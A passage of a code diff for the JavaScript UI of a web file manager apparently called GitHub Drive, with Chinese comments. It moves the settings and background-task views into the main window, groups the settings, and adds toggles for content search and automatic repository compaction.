@@ -190,6 +190,11 @@ class UI {
         // 搜索
         document.getElementById('adv-search-btn')?.addEventListener('click', () => this.showAdvancedSearch());
         document.getElementById('search-input').addEventListener('input', (e) => {
+            // ★ 顶栏常驻后搜索框在任何视图都能输入，
+            //   但搜索结果只存在于文件视图 —— 自动切回去，别让人以为坏了。
+            if (this.app && this.app._currentView && this.app._currentView !== 'all-files') {
+                this.switchView('all-files');
+            }
             clearTimeout(this.searchTimeout);
             this.searchTimeout = setTimeout(() => {
                 this.app.searchFiles(e.target.value);
@@ -224,10 +229,19 @@ class UI {
                     localStorage.setItem('gd_sidebar_collapsed', !isCollapsed);
                 }
             };
-            menuToggle.addEventListener('click', (e) => { e.stopPropagation(); toggleSidebar(); });
+            menuToggle.addEventListener('click', (e) => {
+                e.stopPropagation();
+                if (isMobile()) this.toggleMobileMenu();
+                else toggleSidebar();
+            });
             sidebarOverlay.addEventListener('click', () => toggleSidebar(false));
             document.querySelectorAll('.sidebar .nav-item').forEach(item => {
-                item.addEventListener('click', () => { if (isMobile()) toggleSidebar(false); });
+                item.addEventListener('click', () => {
+                    if (isMobile()) {
+                        // 移动端：侧边栏是"更多"面板，选完就收起
+                        this.toggleMobileMenu(false);
+                    }
+                });
             });
             
             // 恢复电脑端折叠状态
@@ -236,6 +250,24 @@ class UI {
                 if (mainContent) mainContent.classList.add('sidebar-collapsed');
             }
         }
+
+        // 恢复侧边栏分组折叠状态
+        this.restoreNavGroups();
+
+        // 兼容性自检：CSS 缓存版本 + CSS/HTML 的 API 版本（见 app.checkCompatibility）
+        setTimeout(() => { try { this.app.checkCompatibility?.(); } catch (e) {} }, 1200);
+
+        // 任务变化时更新"后台进程"角标
+        window.addEventListener('gd:tasks-changed', () => this.updateTaskBadge());
+        this.updateTaskBadge();
+
+        // 插件增减时，后台进程里的预览卡要立刻跟着变（不用等 700ms 那轮）
+        window.addEventListener('gd:plugin-changed', () => {
+            if (this.app?._currentView === 'tasks') this._renderPluginStages();
+        });
+
+        // 插件入口在移动端也保留：插件跑的是仓库里的 html 或外部 URL，
+        // 不依赖本地后端，手机能跑（只是不飘小窗，改去「后台进程」里看预览）。
 
         // 右键菜单
         document.addEventListener('click', () => this.hideContextMenu());
@@ -296,6 +328,8 @@ class UI {
     // ==================== 视图切换 ====================
 
     switchView(view) {
+        // 离开后台进程视图时停掉刷新定时器（否则它每 700ms 空转一整天）
+        if (this.app._currentView === 'tasks' && view !== 'tasks') this._stopTasksRefresh();
         this.app._currentView = view;
         this.app.saveLastState?.();
         document.querySelectorAll('.nav-item').forEach(item => {
@@ -311,10 +345,15 @@ class UI {
         const emptyState = document.getElementById('empty-state');
         const loadingState = document.getElementById('loading-state');
 
+        // ★ 顶栏全局常驻：不再随视图隐藏。
+        //   以前非文件视图会整排 display:none，切到后台进程/设置时
+        //   上边栏凭空消失，界面像换了个应用。现在只按视图切换可用态。
+        if (toolbarActions) toolbarActions.style.display = '';
+        this._syncToolbarForView(view);
+
         if (view === 'all-files') {
             // 恢复文件浏览器界面
             if (breadcrumb) breadcrumb.style.display = '';
-            if (toolbarActions) toolbarActions.style.display = '';
             if (fileList) fileList.style.display = '';
             // 恢复之前的路径（不保持回收站路径）
             const savedState = this.app.storage.get('last_state', null);
@@ -327,17 +366,15 @@ class UI {
             this.app.fileManager.setCurrentRepo(null);
             this.app.loadFiles();
         } else if (view === 'dashboard') {
-            // 仪表盘视图：隐藏面包屑和工具栏，但显示文件区域
+            // 仪表盘视图：隐藏面包屑，但显示文件区域
             if (breadcrumb) breadcrumb.style.display = 'none';
-            if (toolbarActions) toolbarActions.style.display = 'none';
             if (fileList) fileList.style.display = '';
             if (emptyState) emptyState.classList.add('hidden');
             if (loadingState) loadingState.classList.add('hidden');
             this.app.showDashboard();
         } else {
-            // 非文件视图：隐藏面包屑、工具栏和文件区域
+            // 非文件视图：隐藏面包屑和文件区域
             if (breadcrumb) breadcrumb.style.display = 'none';
-            if (toolbarActions) toolbarActions.style.display = 'none';
             if (fileList) fileList.style.display = 'none';
             if (emptyState) emptyState.classList.add('hidden');
             if (loadingState) loadingState.classList.add('hidden');
@@ -348,11 +385,37 @@ class UI {
                 this.app.showStarredFiles();
             } else if (view === 'trash') {
                 this.app.showTrashFiles();
+            } else if (view === 'settings') {
+                // ★ 设置：占主窗口，不弹窗
+                //   这三个视图都是把列表渲染进 #file-list 的，
+                //   而上面刚把它 display:none 了 —— 必须先还原，
+                //   否则"有 8 个最近文件却一个不显示"。
+                if (fileList) fileList.style.display = '';
+                if (emptyState) emptyState.classList.add('hidden');
+                if (loadingState) loadingState.classList.add('hidden');
+                this._renderSettingsView();
             } else if (view === 'shared') {
                 this.app.showShares();
             } else if (view === 'explore') {
                 this.app.showExploreShares();
+            } else if (view === 'tasks') {
+                // 后台进程：占主窗口，不弹窗
+                if (fileList) fileList.style.display = '';
+                if (breadcrumb) breadcrumb.style.display = 'none';
+                if (emptyState) emptyState.classList.add('hidden');
+                if (loadingState) loadingState.classList.add('hidden');
+                this._renderTasksView();
+                this._startTasksRefresh();
+                // 先渲染出落点，再让小窗飞过来
+                if (typeof TaskDock !== 'undefined' && TaskDock.flyToList) {
+                    requestAnimationFrame(() => TaskDock.flyToList());
+                }
             } else if (view === 'plugins') {
+                // ★ 移动端不加载插件：下载不了后端代码，点了只会白屏
+                if (this.isPluginsBlocked && this.isPluginsBlocked()) {
+                    this.showToast?.('插件在移动端不可用（无法下载插件后端）', 'info');
+                    return;
+                }
                 this.app.showPluginMarket();
             }
         }
@@ -576,6 +639,14 @@ class UI {
         const container = document.getElementById('file-list');
         const emptyState = document.getElementById('empty-state');
         const loadingState = document.getElementById('loading-state');
+
+        // ★ 渲染前必须自己还原可见性。
+        //   switchView 对"非文件视图"写过 container.style.display='none'
+        //   （内联样式优先级高于 CSS 类，只改 className 救不回来）。
+        //   而"最近使用 / 收藏 / 回收站"全都是渲染进这个容器的 ——
+        //   于是出现"明明有 8 个最近文件，点进去一个都不显示"。
+        //   由渲染方自己保证可见，比让每个调用方记得还原更可靠。
+        if (container) container.style.display = '';
 
         loadingState?.classList.add('hidden');
 
@@ -1278,38 +1349,996 @@ class UI {
         }
     }
 
+    /**
+     * 设置面板（分组版）
+     *
+     * ★ 为什么渲染在主窗口而不是弹窗：
+     *   ① 弹窗宽度受限，15 个条目要滚半天
+     *   ② 弹窗里点开二级面板（仓库管理/自动整理）会叠成两层，关掉后容易迷路
+     *   ③ 主窗口可以用「视图」的方式缓存滚动位置，来回切换不丢
+     *
+     * ★ 之前是 15 项平铺一列 —— 找一个"校准用量"要滚半天，
+     *   而且"登出"这种破坏性操作和"暗色模式"挨在一起，容易误点。
+     *   现在按语义分成四组，破坏性操作单独放最后。
+     */
     showSettings() {
-        var versionEl = document.getElementById('app-version');
-        var repoSizeEl = document.getElementById('repo-size-display');
-        var version = versionEl ? versionEl.textContent : 'v-';
-        var repoSize = repoSizeEl ? repoSizeEl.textContent : '📦 --';
-        var items = [
-            {icon:'🌙', title:I18n.t('settings.darkMode') || '暗色模式', desc:I18n.t('settings.darkModeDesc') || '切换深色/浅色主题', action:'ui.toggleDarkMode();'},
-            {icon:'🌐', title:I18n.t('settings.language'), desc:I18n.t('settings.languageDesc'), action:'I18n.toggle();ui.closeModal();'},
-            {icon:'⚙️', title:I18n.t('settings.backend'), desc:I18n.t('settings.backendDesc'), action:'ui.closeModal();ui.showBackendManager();'},
+        // 入口在侧边栏底部按钮，走视图切换 → 主窗口渲染
+        this.switchView('settings');
+    }
 
-            {icon:'❓', title:I18n.t('settings.help'), desc:I18n.t('settings.helpDesc'), action:'ui.closeModal();ui.showHelp();'},
-            {icon:'🧹', title:I18n.t('settings.maintain') || '仓库维护', desc:I18n.t('settings.maintainDesc') || '扫描孤儿与幽灵文件', action:'ui.closeModal();ui.showMaintain();'},
-            {icon:'📖', title:I18n.t('settings.docs'), desc:I18n.t('settings.docsDesc'), action:"window.open('https://cool-zimo.github.io/github_drive_documentation/','_blank');"},
-            {icon:'🔀', title:I18n.t('settings.versionSwitch') || '版本切换', desc:I18n.t('settings.versionSwitchDesc') || '体验他人改进的版本', action:'ui.closeModal();ui.showVersionSwitcher();'},
-            {icon:'🔍', title:I18n.t('settings.contentSearch') || '内容搜索', desc:I18n.t('settings.contentSearchDesc') || '搜索时同时匹配文件内容', action:'ui.toggleContentSearch();'},
-            {icon:'🎯', title:'智能分类', desc:'按文件类型自动整理到文件夹', action:'ui.closeModal();app.showCategoryStats();'},
-            {icon:'📊', title:I18n.t('settings.storageStats') || '存储用量', desc:I18n.t('settings.storageStatsDesc') || '查看文件统计和仓库大小', action:'ui.closeModal();app.showStorageStats();'},
-            {icon:'💾', title:I18n.t('settings.export'), desc:I18n.t('settings.exportDesc'), action:'app.exportBackup();ui.closeModal();'},
-            {icon:'🏷️', title:I18n.t('settings.version'), desc:'GitHub Drive', extra:version},
-            {icon:'🚪', title:I18n.t('settings.logout'), desc:I18n.t('settings.logoutDesc'), action:"if(confirm(I18n.t('settings.logoutConfirm'))){app.logout();ui.closeModal();}", danger:true}
+    _settingsGroups() {
+        var versionEl = document.getElementById('app-version');
+        var version = versionEl ? versionEl.textContent : 'v-';
+
+        const GROUPS = [
+            {
+                title: '外观',
+                items: [
+                    {icon:'🌙', title:I18n.t('settings.darkMode') || '暗色模式', desc:I18n.t('settings.darkModeDesc') || '切换深色/浅色主题', action:'ui.toggleDarkMode();'},
+                    {icon:'🌐', title:I18n.t('settings.language'), desc:I18n.t('settings.languageDesc'), action:'I18n.toggle();ui.closeModal();'},
+                    {icon:'🎨', title:'界面自定义', desc:'侧边栏/顶栏右键可勾选显示项，这里调主题与字号',
+                     action:'ui.closeModal();ui.showLookPanel();'},
+                    {icon:'🔗', title:'仓鼠联动', desc:'默认关闭 · 打开后登录页才会出现「沿用仓鼠账号」',
+                     action:'ui.toggleBridge();',
+                     extra:(localStorage.getItem('gd_bridge_enabled') === '1' ? '开' : '关')},
+                ]
+            },
+            {
+                title: '存储与仓库',
+                items: [
+                    {icon:'🗂️', title:'存储仓库管理', desc:'逐仓用量、新建仓库、校准容量登记、整理合并', action:'ui.closeModal();ui.showStorageManager();'},
+                    {icon:'🤖', title:'自动整理设置', desc:'后台自动填满仓库、删除腾空的仓', action:'ui.closeModal();ui.showAutoCompactSettings();'},
+                ]
+            },
+            {
+                title: '功能',
+                items: [
+                    {icon:'🔍', title:I18n.t('settings.contentSearch') || '内容搜索', desc:I18n.t('settings.contentSearchDesc') || '搜索时同时匹配文件内容', action:'ui.toggleContentSearch();',
+                     extra:(localStorage.getItem('gd_search_content') === '1' ? '开' : '关')},
+                    {icon:'🎯', title:'智能分类', desc:'按文件类型自动整理到文件夹', action:'ui.closeModal();app.showCategoryStats();'},
+                    {icon:'⚙️', title:I18n.t('settings.backend'), desc:I18n.t('settings.backendDesc'), action:'ui.closeModal();ui.showBackendManager();'},
+                ]
+            },
+            {
+                title: '关于与账号',
+                items: [
+                    {icon:'❓', title:I18n.t('settings.help'), desc:I18n.t('settings.helpDesc'), action:'ui.closeModal();ui.showHelp();'},
+                    {icon:'🔀', title:I18n.t('settings.versionSwitch') || '版本切换', desc:I18n.t('settings.versionSwitchDesc') || '体验他人改进的版本', action:'ui.closeModal();ui.showVersionSwitcher();'},
+                    {icon:'💾', title:I18n.t('settings.export'), desc:I18n.t('settings.exportDesc'), action:'app.exportBackup();ui.closeModal();'},
+                    {icon:'🏷️', title:I18n.t('settings.version'), desc:'GitHub Drive', extra:version},
+                    {icon:'🚪', title:I18n.t('settings.logout'), desc:I18n.t('settings.logoutDesc'), action:"if(confirm(I18n.t('settings.logoutConfirm'))){app.logout();ui.closeModal();}", danger:true}
+                ]
+            }
         ];
-        var body = '';
-        for (var i = 0; i < items.length; i++) {
-            var it = items[i];
-            var extraHtml = it.extra ? ' <span style="font-weight:400;font-size:13px;color:#6b7280;">' + it.extra + '</span>' : '';
-            var color = it.danger ? 'color:#dc2626;' : '';
-            var hoverBg = it.danger ? '#fef2f2' : '#f3f4f6';
-            body += '<div onclick="' + (it.action || '') + '" style="display:flex;align-items:center;gap:12px;padding:12px;border-radius:8px;cursor:pointer;margin-bottom:8px;' + color + '" onmouseover="this.style.background=\"' + hoverBg + '\"" onmouseout="this.style.background=\"transparent\"">';
-            body += '<span style="font-size:20px;">' + it.icon + '</span>';
-            body += '<div><div style="font-weight:600;font-size:14px;">' + it.title + extraHtml + '</div><div style="font-size:12px;color:#6b7280;">' + it.desc + '</div></div></div>';
+
+        let body = '';
+        for (const g of GROUPS) {
+            body += '<div style="margin-bottom:14px;">'
+                  +   '<div style="font-size:11px;font-weight:700;color:var(--text-tertiary);letter-spacing:0.5px;'
+                  +   'text-transform:uppercase;padding:0 4px 6px;">' + g.title + '</div>';
+            for (const it of g.items) {
+                const extraHtml = it.extra ? ' <span style="font-weight:400;font-size:13px;color:#6b7280;">' + it.extra + '</span>' : '';
+                const color = it.danger ? 'color:#dc2626;' : '';
+                const hoverBg = it.danger ? 'var(--danger-light, #fef2f2)' : 'var(--bg-hover, #f3f4f6)';
+                body += '<div onclick="' + (it.action || '') + '" style="display:flex;align-items:center;gap:12px;padding:12px;border-radius:8px;cursor:pointer;margin-bottom:6px;' + color + '" onmouseover="this.style.background=\"' + hoverBg + '\"" onmouseout="this.style.background=\"transparent\"">';
+                body += '<span style="font-size:20px;">' + it.icon + '</span>';
+                body += '<div><div style="font-weight:600;font-size:14px;color:var(--text-primary);">' + it.title + extraHtml + '</div><div style="font-size:12px;color:var(--text-secondary);">' + it.desc + '</div></div></div>';
+            }
+            body += '</div>';
         }
-        this.showModal(I18n.t('settings.title'), body, '', true);
+        return body;
+    }
+
+    /**
+     * 设置页渲染到主窗口
+     *
+     * ★ 必须清掉 switchView 写的内联 display:none ——
+     *   内联样式优先级高于 CSS 类，只改 className 不管用
+     *   （"我的分享""最近使用"列表空白都是同一个原因）。
+     */
+    /**
+     * 🔗 仓鼠联动开关（默认关闭）
+     *
+     * ★ 为什么默认关：跨应用联动会在登录页多出一整块提示区，
+     *   多数情况下用不到，反而把登录页挤乱。
+     *   关掉时连 Bridge 都不去读 —— 不只是隐藏显示。
+     */
+    toggleBridge() {
+        const cur = localStorage.getItem('gd_bridge_enabled') === '1';
+        const next = !cur;
+        localStorage.setItem('gd_bridge_enabled', next ? '1' : '0');
+        this.showToast?.(next ? '已开启仓鼠联动，刷新登录页后生效' : '已关闭仓鼠联动', 'info');
+        if (this.app?._currentView === 'settings') this._renderSettingsView();
+    }
+
+    /** 外观面板：从设置项点进来时直接滚到自定义控件 */
+    showLookPanel() {
+        this.switchView('settings');
+        setTimeout(function () {
+            var host = document.getElementById('gd-look-host');
+            if (host && host.scrollIntoView) host.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }, 60);
+    }
+
+    _renderSettingsView() {
+        const fileList = document.getElementById('file-list');
+        if (!fileList) return;
+        fileList.style.display = '';
+        fileList.className = 'settings-view';
+        fileList.innerHTML =
+            '<div style="max-width:760px;margin:0 auto;">'
+          +   '<h2 style="font-size:20px;font-weight:700;margin:0 0 4px;color:var(--text-primary);">'
+          +   (I18n.t('settings.title') || '设置').replace(/^[\u2190-\uFFEF\u2600-\u27BF\s]+/, '') + '</h2>'
+          +   '<div style="font-size:12px;color:var(--text-tertiary);margin-bottom:18px;">'
+          +   (I18n.t('settings.groupedHint', '设置项已按用途分组')) + '</div>'
+          +   this._settingsGroups()
+          + '</div>';
+        // 外观控件由 GdCustom 提供；模块没加载就跳过，不能让设置页开不了
+        try {
+            if (window.GdCustom && window.GdCustom.bindLook) {
+                var host = document.createElement('div');
+                host.id = 'gd-look-host';
+                host.innerHTML = window.GdCustom.lookSectionHtml();
+                var wrap = fileList.firstChild;
+                if (wrap) wrap.appendChild(host);
+                window.GdCustom.bindLook(host);
+            }
+        } catch (e) { /* 设置页不能因为外观控件挂掉 */ }
+    }
+
+    /**
+     * 内容搜索开关
+     *
+     * ★ 这个方法之前根本不存在 —— 设置里那条写着 action:'ui.toggleContentSearch();'，
+     *   点下去抛 ReferenceError，界面上就是"点了没反应"。
+     *   而且就算实现了开关，fileManager.searchFiles 也把第二个参数丢了，
+     *   所以这里连同真正的开关状态一起修。
+     */
+    toggleContentSearch() {
+        const cur = localStorage.getItem('gd_search_content') === '1';
+        const next = !cur;
+        localStorage.setItem('gd_search_content', next ? '1' : '0');
+        this.showToast?.(
+            next ? '内容搜索已开启：搜索时也会匹配文本文件内容（更慢）'
+                 : '内容搜索已关闭：只匹配文件名',
+            next ? 'success' : 'info');
+        // 就地刷新，让"开/关"状态立刻变
+        if (this.app?._currentView === 'settings') this._renderSettingsView();
+    }
+
+
+    /**
+     * 自动整理设置
+     *
+     * 默认行为说明要写清楚：**只迁移，不删仓**。
+     * 迁移是可控的（数据还在源仓），删仓不可逆 ——
+     * 后台默默删仓库这件事，默认开太危险了。
+     */
+    showAutoCompactSettings() {
+        const cfg = (this.app && this.app.storage && this.app.storage.getStorageConfig()) || {};
+        const on = cfg.autoCompact !== false;
+        const del = cfg.autoCompactDelete === true;
+        const maxMB = cfg.autoCompactMaxMoveMB || 300;
+        const coolH = cfg.autoCompactCooldownHours || 24;
+
+        let last = '从未运行';
+        if (cfg.lastAutoCompactAt) {
+            const h = Math.floor((Date.now() - cfg.lastAutoCompactAt) / 3600000);
+            last = h < 1 ? '刚刚' : (h < 24 ? `${h} 小时前` : `${Math.floor(h / 24)} 天前`);
+        }
+
+        const row = (label, desc, ctl) =>
+            `<div style="padding:12px;border:1px solid #e5e7eb;border-radius:10px;margin-bottom:8px;">
+                <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
+                    <div style="flex:1;min-width:200px;">
+                        <div style="font-size:13px;font-weight:600;color:#1f2937;">${label}</div>
+                        <div style="font-size:12px;color:#6b7280;line-height:1.5;margin-top:2px;">${desc}</div>
+                    </div>
+                    ${ctl}
+                </div>
+             </div>`;
+
+        const toggle = (act, cur, onT, offT) =>
+            `<button onclick="ui.toggleAutoCompact('${act}')"
+                style="min-width:64px;padding:6px 12px;border-radius:999px;border:1px solid #d1d5db;
+                       background:${cur ? '#2563eb' : '#f3f4f6'};color:${cur ? '#fff' : '#6b7280'};
+                       font-size:12px;font-weight:600;cursor:pointer;white-space:nowrap;">
+                ${cur ? onT : offT}</button>`;
+
+        const body = `
+        <div style="padding:8px 0;font-size:13px;line-height:1.7;">
+            <div style="padding:12px;background:#eff6ff;border:1px solid #bfdbfe;border-radius:10px;margin-bottom:12px;font-size:12px;color:#1e40af;line-height:1.6;">
+                <b>整理方式：填满大仓 → 删除腾空的仓</b><br>
+                <span style="color:#1e3a8a;">
+                按分片搬运，把排在前面的仓尽量塞到 900 MB，
+                剩下的往后堆，最后把<b>归零的仓删掉</b>。<br>
+                删空仓会少一份额度，但空仓随时能自动重建，不影响使用。
+                </span>
+            </div>
+
+            ${row('自动整理', '满足条件时后台自动执行', toggle('autoCompact', on, '已开启', '已关闭'))}
+            ${row('自动删除腾空的仓', '迁移完成后把空仓删掉（<b>不可恢复</b>）', toggle('autoCompactDelete', del, '会删除', '保留'))}
+            ${row('单次迁移上限', `超过这个量就不在后台默默搬（当前 ${maxMB} MB）`,
+                `<input id="ac-maxmb" type="number" value="${maxMB}" min="10" max="2000" step="50"
+                    style="width:84px;padding:6px 8px;border:1px solid #d1d5db;border-radius:8px;font-size:13px;">
+                 <span style="font-size:12px;color:#9ca3af;">MB</span>`)}
+            ${row('冷却时间', `两次整理之间至少间隔（当前 ${coolH} 小时）`,
+                `<input id="ac-coolh" type="number" value="${coolH}" min="1" max="720" step="1"
+                    style="width:84px;padding:6px 8px;border:1px solid #d1d5db;border-radius:8px;font-size:13px;">
+                 <span style="font-size:12px;color:#9ca3af;">小时</span>`)}
+
+            <div style="font-size:12px;color:#9ca3af;margin:10px 0;">
+                上次整理：${last}
+            </div>
+
+            <div style="display:flex;gap:8px;flex-wrap:wrap;">
+                <button class="btn-primary btn-sm" onclick="ui.saveAutoCompact()">保存并立即评估</button>
+                <button class="btn-secondary btn-sm" onclick="ui.closeModal();ui.showStorageManager();">手动整理</button>
+            </div>
+        </div>`;
+        this.showModal('🤖 自动整理设置', body, '', true);
+    }
+
+    /** 切换自动整理的某个开关 */
+    toggleAutoCompact(key) {
+        if (!this.app || !this.app.storage) return;
+        const cfg = this.app.storage.getStorageConfig() || {};
+        if (key === 'autoCompact') cfg.autoCompact = cfg.autoCompact === false;
+        if (key === 'autoCompactDelete') cfg.autoCompactDelete = cfg.autoCompactDelete !== true;
+        this.app.storage.updateStorageConfig?.(cfg);
+        this.app.configSync?.scheduleSync?.();
+        this.showAutoCompactSettings();
+    }
+
+    /** 保存数值设置，并立刻评估一次 */
+    saveAutoCompact() {
+        if (!this.app || !this.app.storage) return;
+        const cfg = this.app.storage.getStorageConfig() || {};
+        const mb = parseInt((document.getElementById('ac-maxmb') || {}).value, 10);
+        const ch = parseInt((document.getElementById('ac-coolh') || {}).value, 10);
+        if (mb >= 10 && mb <= 2000) cfg.autoCompactMaxMoveMB = mb;
+        if (ch >= 1 && ch <= 720) cfg.autoCompactCooldownHours = ch;
+        this.app.storage.updateStorageConfig?.(cfg);
+        this.app.configSync?.scheduleSync?.();
+        this.closeModal();
+        // 清掉冷却，让用户能立刻看到评估结果
+        const c = this.app.storage.getStorageConfig() || {};
+        delete c.lastAutoCompactAt;
+        this.app.storage.updateStorageConfig?.(c);
+        setTimeout(() => this.app.maybeAutoCompact?.('手动触发'), 300);
+    }
+
+    // ==================== 导航分组折叠 ====================
+
+    /** 侧边栏分组折叠。状态存 localStorage，刷新后保持。 */
+    toggleNavGroup(name) {
+        const key = 'gd_navgroup_' + name;
+        const header = document.querySelector(`.nav-group-header[data-group="${name}"]`);
+        const body = document.querySelector(`.nav-group-body[data-group-body="${name}"]`);
+        if (!header || !body) return;
+        const open = !body.classList.contains('open');
+        body.classList.toggle('open', open);
+        header.classList.toggle('open', open);
+        try { localStorage.setItem(key, open ? '1' : '0'); } catch (e) {}
+    }
+
+    /** 恢复折叠状态（默认展开） */
+    restoreNavGroups() {
+        document.querySelectorAll('.nav-group-header[data-group]').forEach(header => {
+            const name = header.getAttribute('data-group');
+            const body = document.querySelector(`.nav-group-body[data-group-body="${name}"]`);
+            if (!body) return;
+            let open = true;
+            try { const v = localStorage.getItem('gd_navgroup_' + name); if (v !== null) open = v === '1'; } catch (e) {}
+            body.classList.toggle('open', open);
+            header.classList.toggle('open', open);
+        });
+    }
+
+    // ==================== 后台进程 ====================
+
+    /**
+     * 后台进程面板：所有耗时任务的统一入口。
+     *
+     * ★ 为什么要在侧边栏单独加一个入口：
+     *   小窗是"贴边显示"的，超过 3 个就合并成一张卡，
+     *   合并之后点开是列表、再点才是详情 —— 想看全局很费劲。
+     *   这里直接一次列全，进度、子项、失败原因都在。
+     *
+     * ★ 打开时小窗会"飞"进来（TaskDock.flyToList），
+     *   给用户一个"它们都跑这儿来了"的视觉交代，而不是凭空列出一堆行。
+     */
+    /**
+     * 后台进程：显示在主窗口（不是弹窗）。
+     *
+     * ★ 为什么改：
+     *   原来用 showModal 弹窗。弹窗是叠在文件列表上的浮层 ——
+     *   看任务的时候没法同时翻文件，而"传完了没、要不要接着传"
+     *   恰恰需要边看进度边决定。而且弹窗一关进度就断了。
+     *   现在走 switchView('tasks')，像"最近/收藏"一样占主窗口。
+     */
+    showTaskManager() {
+        // 侧边栏高亮同步（走 nav 的话 switchView 已经切过了，这里兜底）
+        document.querySelectorAll('.nav-item').forEach(item => {
+            item.classList.toggle('active', item.dataset.view === 'tasks');
+        });
+        this.switchView('tasks');
+    }
+
+    /** 主窗口渲染后台进程 */
+    /**
+     * 顶栏常驻后，按视图同步按钮可用态。
+     * 直接隐藏会造成"点了没反应"，所以改成置灰 + 提示。
+     * 用户自己在右键菜单里勾掉的项（hidden）不受影响。
+     */
+    _syncToolbarForView(view) {
+        const isFiles = (view === 'all-files');
+        // 只依赖当前文件列表上下文的按钮
+        const FILE_ONLY = ['#adv-search-btn', '#folder-tree-btn', '#view-toggle-btn'];
+        FILE_ONLY.forEach(sel => {
+            const el = document.querySelector('.toolbar ' + sel)
+                    || document.querySelector(sel);
+            if (!el) return;
+            el.disabled = !isFiles;
+            el.classList.toggle('gd-bar-off', !isFiles);
+            el.title = isFiles ? '' : '切换到「全部文件」后可用';
+        });
+    }
+
+    _renderTasksView() {
+        const fileList = document.getElementById('file-list');
+        if (!fileList) return;
+        // ★ 显示前必须清掉内联 display:none ——
+        //   switchView 对非文件视图写过 style.display='none'，
+        //   内联样式优先级高于 CSS 类，只改 className 不管用
+        //   （之前"我的分享"列表空白就是这个原因）。
+        fileList.style.display = '';
+        // ★ 不能只给 'file-list'：它是 display:grid（文件格子布局），
+        //   .tasks-view 会变成一个 grid item 被压进第一列（约 180px），
+        //   于是整个后台进程视图挤在左上角，margin:0 auto 也不生效。
+        //   加 gd-tasks-host 把它改回块级，居中才真的居中。
+        fileList.className = 'file-list gd-tasks-host';
+        // ★ 插件预览区和任务列表分开：
+        //   任务列表每 700ms 刷新一次，预览区不能跟着重建，
+        //   否则预览卡会被销毁再生成，插件窗口每 0.7 秒闪一下。
+        fileList.innerHTML = '<div class="tasks-view" id="task-mgr-body">'
+            + '<div id="tm-stages"></div><div id="tm-list"></div></div>';
+        this._renderPluginStages();
+        this._renderTaskList();
+    }
+
+    /** 插件预览区：内容没变就不重绘（只在插件增减时重建） */
+    _renderPluginStages() {
+        const box = document.getElementById('tm-stages');
+        if (!box) return;
+        if (typeof TaskDock === 'undefined' || !TaskDock.pluginStagesHTML) return;
+        const html = TaskDock.pluginStagesHTML();
+        if (box.getAttribute('data-sig') !== html) {
+            box.innerHTML = html;
+            box.setAttribute('data-sig', html);
+        }
+        try { TaskDock.bindPluginStages(box); } catch (e) { console.warn(e); }
+    }
+
+    _renderTaskList() {
+        const box = document.getElementById('tm-list');
+        if (!box) return;
+        box.innerHTML = this._taskManagerHTML();
+        this._bindTaskManager(box);
+    }
+
+    /** 后台进程视图的实时刷新（跑着的任务要能看到进度在动） */
+    _startTasksRefresh() {
+        const refresh = () => {
+            // 已经不在后台进程视图了就停
+            if (this.app?._currentView !== 'tasks') { this._stopTasksRefresh(); return; }
+            this._renderTaskList();
+            this._renderPluginStages();
+        };
+        this._stopTasksRefresh();
+        this._taskMgrTimer = setInterval(refresh, 700);
+    }
+
+    _stopTasksRefresh() {
+        clearInterval(this._taskMgrTimer);
+        this._taskMgrTimer = null;
+        // 离开视图 → 还在跑的任务回到边缘小窗
+        try { TaskDock.resumeMini && TaskDock.resumeMini(); } catch (e) {}
+        // 预览区销毁 → 收起的插件窗口先藏起来，等下次进来再贴上去
+        try { TaskDock.stopPluginStages && TaskDock.stopPluginStages(); } catch (e) {}
+    }
+
+    _taskManagerHTML() {
+        if (typeof TaskDock === 'undefined' || !TaskDock.all) {
+            return '<div style="font-size:13px;color:#6b7280;">任务模块未加载</div>';
+        }
+        const all = TaskDock.all();
+        if (!all.length) {
+            return `<div class="gd-tasks-empty">
+                      <div class="tv-ico">✅</div>
+                      <div class="tv-t">没有正在进行的任务</div>
+                      <div class="tv-s">
+                        上传、下载、分享、整理仓库都会出现在这里
+                      </div></div>`;
+        }
+        const ico = { upload: '📤', download: '⬇️', share: '🔗', compact: '🧹' };
+        const esc = v => String(v == null ? '' : v)
+            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+        const ago = ts => {
+            if (!ts) return '';
+            const s = Math.floor((Date.now() - ts) / 1000);
+            if (s < 60) return s + ' 秒前';
+            if (s < 3600) return Math.floor(s / 60) + ' 分钟前';
+            return Math.floor(s / 3600) + ' 小时前';
+        };
+
+        // 跑着的排前面，其次失败，最后已完成
+        const rank = { running: 0, error: 1, done: 2 };
+        all.sort((a, b) => (rank[a.status] ?? 3) - (rank[b.status] ?? 3) || b.startedAt - a.startedAt);
+
+        let h = '';
+        const running = all.filter(t => t.status === 'running').length;
+        const errored = all.filter(t => t.status === 'error').length;
+        if (running || errored) {
+            h += `<div style="font-size:12px;color:#6b7280;margin-bottom:10px;">
+                    ${running ? `进行中 ${running}` : ''}${running && errored ? ' · ' : ''}${errored ? `<span style="color:#dc2626;">失败 ${errored}</span>` : ''}
+                  </div>`;
+        }
+
+        for (const t of all) {
+            const cls = t.status === 'error' ? ' is-error' : (t.status === 'done' ? ' is-done' : '');
+            const sub = t.status === 'error'
+                ? `<span style="color:#dc2626;">${esc(t.error || '失败')}</span>`
+                : t.status === 'done'
+                    ? (t.note || '已完成')
+                    : (t.single ? (t.note || '处理中')
+                        : `${t.items.filter(i => i.status === 'done').length}/${t.items.length} 个文件`);
+            let detail = '';
+            if (!t.single && t.items.length) {
+                // 子项只显示有状态的：已完成/失败/正在跑
+                const rows = t.items.filter(i => i.status !== 'pending').slice(-40);
+                if (rows.length) {
+                    detail = '<div class="task-mgr-items">' + rows.map(i =>
+                        `<div><span class="${i.status === 'done' ? 'ok' : (i.status === 'error' ? 'bad' : '')}">${
+                            i.status === 'done' ? '✓' : (i.status === 'error' ? '✗' : '·')}</span> ${esc(i.name)}</div>`
+                    ).join('') + '</div>';
+                }
+            }
+            h += `<div class="task-mgr-row${cls}" data-id="${t.id}">
+                    <div class="task-mgr-ico">${ico[t.type] || '📋'}</div>
+                    <div class="task-mgr-main">
+                        <div class="task-mgr-title">${esc(t.title)}</div>
+                        <div class="task-mgr-sub">${sub}</div>
+                        <div class="task-mgr-bar"><div class="task-mgr-fill" style="width:${t.percent}%"></div></div>
+                        ${detail}
+                    </div>
+                    <div class="task-mgr-right">
+                        <div>${t.percent}%</div>
